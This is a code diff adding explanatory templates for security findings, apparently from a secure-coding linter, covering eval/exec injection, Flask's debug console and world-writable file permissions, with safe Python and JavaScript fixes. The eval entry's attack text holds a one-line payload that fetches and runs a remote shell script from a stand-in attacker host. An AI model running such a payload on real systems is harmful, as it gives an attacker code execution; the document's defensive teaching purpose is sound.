@@ -434,6 +434,105 @@ TEMPLATES.update({
 # variant only has to state what actually differs.
 
 VARIANTS: dict[str, list[tuple[re.Pattern[str], dict[str, str]]]] = {
+    "CS003": [
+        (re.compile(r"(?i)executes a constructed string as code"), {
+            "why": (
+                "eval() and exec() hand a string to the language itself. There is no "
+                "shell involved and no sandbox: the string becomes code in this "
+                "process, with this process's imports, variables and permissions."
+            ),
+            "attack": (
+                "__import__('os').system('curl attacker.example/s.sh | sh') is a "
+                "single expression. It needs no quotes to escape and no shell "
+                "metacharacter - eval is already the thing that runs it."
+            ),
+            "fix_python": (
+                "# For data, parse it as data\n"
+                "import json\n"
+                "value = json.loads(raw)\n\n"
+                "# For a literal only - no calls, no attribute access, no imports\n"
+                "import ast\n"
+                "value = ast.literal_eval(raw)\n\n"
+                "# For a calculation, map names to functions you chose yourself.\n"
+                "# There is no safe way to eval() a string an attacker influenced."
+            ),
+            "fix_javascript": (
+                "// For data, parse it as data\n"
+                "const value = JSON.parse(raw);\n\n"
+                "// For dynamic dispatch, use a lookup you control\n"
+                "const handlers = { sum, average, median };\n"
+                "const fn = handlers[name];\n"
+                "if (!fn) throw new Error(`unknown operation: ${name}`);\n\n"
+                "// new Function() and setTimeout(string) are eval by another name."
+            ),
+        }),
+    ],
+    "CS009": [
+        (re.compile(r"(?i)debug=True|interactive console"), {
+            "why": (
+                "The development server's debugger is not a log viewer. When an "
+                "exception reaches it, it renders a page with an interactive console "
+                "that evaluates whatever you type, inside the running process. That "
+                "is a deliberate feature for a machine only you can reach, and "
+                "nothing about the code changes when it is deployed somewhere else."
+            ),
+            "attack": (
+                "Anyone who can trigger an unhandled exception gets a Python prompt "
+                "on your server - reading environment variables, opening files, "
+                "making outbound connections. Werkzeug pins it behind a PIN, which "
+                "is derived from machine details an attacker who can already read "
+                "one file can reconstruct."
+            ),
+            "fix_python": (
+                "# Debug never comes from the code - it comes from the environment,\n"
+                "# so the deployed artefact is identical to the one you tested.\n"
+                "import os\n"
+                "app.run(debug=os.environ.get(\"FLASK_DEBUG\") == \"1\")\n\n"
+                "# And in production do not run this server at all:\n"
+                "#   gunicorn -w 4 app:app"
+            ),
+            "fix_javascript": (
+                "// Never ship a debug/inspect port. It is a debugger, not a log.\n"
+                "//   node --inspect  is for your laptop only\n"
+                "if (process.env.NODE_ENV !== 'production') {\n"
+                "  app.use(errorHandler({ debug: true }));\n"
+                "}"
+            ),
+        }),
+        (re.compile(r"(?i)world-writable"), {
+            "why": (
+                "Mode 777 grants read, write and execute to every account on the "
+                "machine. On a shared host or inside a container running more than "
+                "one service, that is a much larger set of writers than you meant - "
+                "and if the file is ever executed or imported, they choose what runs."
+            ),
+            "attack": (
+                "Any local process replaces the file between your writing it and "
+                "your reading it. If it is a script, a config file or anything "
+                "imported at startup, the replacement runs as you at the next "
+                "restart. No remote access is needed - a foothold anywhere on the "
+                "box is enough."
+            ),
+            "fix_python": (
+                "import os\n"
+                "import stat\n\n"
+                "# owner read/write only - the default for anything sensitive\n"
+                "os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)          # 0o600\n\n"
+                "# owner writes, group reads\n"
+                "os.chmod(path, 0o640)\n\n"
+                "# Better still: create it with the right mode rather than widening\n"
+                "# it and narrowing it again - there is a window in between.\n"
+                "#   os.open(path, os.O_CREAT | os.O_WRONLY, 0o600)"
+            ),
+            "fix_javascript": (
+                "const fs = require('node:fs');\n\n"
+                "// owner read/write only\n"
+                "fs.chmodSync(path, 0o600);\n\n"
+                "// or create it correctly in the first place\n"
+                "fs.writeFileSync(path, data, { mode: 0o600 });"
+            ),
+        }),
+    ],
     "CS004": [
         (re.compile(r"(?i)random|predictable|securerandom"), {
             "why": (
